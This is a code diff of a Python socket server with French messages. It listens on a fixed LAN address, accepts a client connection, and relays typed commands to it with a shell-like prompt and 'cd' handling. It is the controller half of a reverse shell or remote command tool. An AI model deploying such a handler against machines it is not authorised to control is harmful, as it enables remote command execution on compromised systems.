@@ -6,9 +6,8 @@
 # Actual version : 1.0
 
 import socket
-import sys
 
-host, port = ('', 6666)
+host, port = ('192.168.1.100', 1235)
 
 socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 socket.bind((host, port))
@@ -18,15 +17,26 @@ while True:
     socket.listen()
     conn, address = socket.accept()
     print("/!\ Client connecté /!\ ")
-    while True:
-        print("Envoyer une commande :")
-        data=str( sys.stdin.readline() )
-        data = data.encode("utf8")
-        conn.send(data)
 
-        data = conn.recv(9999)
-        data = str( data.decode("utf-8", errors="ignore"))
-        print("Message reçu :\n"+data)
+    path = conn.recv(9999).decode("utf8") + '$ '
+    print(path)
+
+    while True:
+        data=str( input(path) )
+
+        if data[:2] == "cd":
+            data = data.encode("utf8")
+            conn.send(data)
+            path = conn.recv(9999)
+            path = str( path.decode("utf-8", errors="ignore")) + '$ '
+        else:
+
+            data = data.encode("utf8")
+            conn.send(data)
+
+            data = conn.recv(9999)
+            data = str( data.decode("utf-8", errors="ignore"))
+            print("\n"+data)
 
 conn.close()
 socket.close()
